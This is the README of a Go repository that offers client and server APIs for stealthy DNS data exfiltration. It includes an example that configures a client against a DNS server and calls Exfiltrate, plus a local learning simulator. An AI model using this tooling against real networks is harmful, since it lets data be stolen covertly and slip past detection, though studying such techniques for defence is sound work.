# DNS-Communications

DNS-Communications, a repo that performs DNS exfiltration by sending out DNS. Provides both client & server APIs

## How it works

DNS Exfiltration is nothing new, it is a technique used to extract data from a network by encoding it into DNS queries. However, traditional DNS exfiltration methods are often quite easy to detect and block.

This project aims to provide a more stealthy approach to DNS exfiltration by using a custom DNS server which can respond to real DNS queries while also allowing for the exfiltration of data in small chunks over time. The client can send data to the server by encoding it into DNS queries, which are then decoded by the server and stored for later retrieval. You can choose how stealthy you want to be by adjusting settings which let you go from "send it all at once in TXT and NULL records" to "send it in tiny chunks using real domain names and subdomains as part of a code over a few days".

A default expandible word list is provided to facilitate encoding and decoding long strings of data into DNS queries.

---

## Example

```go
var (
    client *client.Client
    err error
)

if client, err = client.NewClient(client.Config{
    Servers: []client.ServerConfig{
        {Host:"example.com", Port:53},
    },
    Stealth: client.StealthConfig{
        Duration: client.DurationConfig{
            Min: 1 * time.Second,
            Max: 5 * time.Second,
        },
        ReplaceWithWordList: true,
    },
}); err != nil {
    log.Fatal(err)
}


if err = client.Exfiltrate([]byte("Hello, World!")); err != nil {
    log.Fatal(err)
}
```

## Learning Utility

This is also a learning utility provided in the form of a web app. It shows the relationship between the exfiltrating client, the server, and provides the ability to get a packet capture of the DNS queries being sent out.
## Web simulator

Requires Go (the version in `go.mod` or newer) and Bun 1.3.5+.

```sh
bun install
bun run dev
```

Open the URL printed by Vite. React and Tailwind render a small local simulator;
Go WASM uses the existing codecs to encode DNS responses and recover the message.
The network simulator is not implemented yet; this screen performs an in-memory
codec round trip and sends no DNS traffic.

Vite builds WASM before serving, watches Go files and `go.mod`/`go.sum`, and reloads
the page after a successful rebuild. A Go rebuild resets the form. The matching
`wasm_exec.js` comes from the active Go installation. Generated files are ignored.

```sh
bun run build    # Build frontend and WASM into web/dist
bun run preview  # Preview the production build
bun run check    # Frontend formatting, lint, and TypeScript checks
bun test         # Real Go WASM round-trip tests
```

GitHub Actions runs these checks alongside Go formatting, vet, tests, and builds.
